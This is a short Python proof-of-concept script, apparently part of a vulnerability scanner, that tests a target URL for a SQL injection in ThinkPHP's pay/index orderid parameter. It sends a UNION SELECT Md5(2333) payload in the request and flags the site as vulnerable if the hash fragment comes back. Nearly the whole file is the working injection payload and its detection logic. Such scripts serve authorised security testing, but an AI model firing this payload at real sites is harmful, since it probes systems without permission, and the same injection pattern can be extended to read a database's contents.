# encoding: utf-8
'''
@Version:   V1.0
@Author:    JE2Se
@Contact:   admin@je2se.com
@Website:   https://www.je2se.com
@Github:    https://github.com/JE2Se/
@Time:  2020/6/10 17:07
@File:  ThinkPHP_PAY_SQLI_POC.py
@Desc:
'''
import requests
from lib import *
from lib.Urldeal import umethod
import logging

def ThinkPHP_PAY_SQLI_POC(Url):
    scheme, url, port = umethod(Url)
    headers = {
        "User-Agent":  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:49.0) Gecko/20100101 Firefox/49.0",
    }
    try:
        payload_url = scheme + "://" + url + ":" + str(port) + "/index.php?s=/home/pay/index/orderid/1%27)UnIoN/**/All/**/SeLeCT/**/Md5(2333)--+"
        resp = requests.get(payload_url, headers=headers, timeout=6, verify=False)
        con = resp.text
        if r"540676a129760a" in con:
            print(Vcolors.RED +"[!] 存在ThinkPHP SQL注入漏洞:->ThinkPHP_PAY_SQLI_POC\r" + Vcolors.ENDC)
    except:
        logging.error("ThinkPHP_PAY_SQLI_POC脚本出现异常")